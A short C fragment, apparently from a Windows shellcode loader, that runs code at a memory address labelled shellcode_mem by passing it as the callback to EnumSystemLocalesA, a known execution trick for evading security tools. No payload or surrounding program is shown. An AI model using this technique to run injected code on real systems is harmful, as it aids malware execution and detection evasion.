

void execute(PVOID shellcode_mem) {
    EnumSystemLocalesA((LOCALE_ENUMPROCA)shellcode_mem, 0);
}
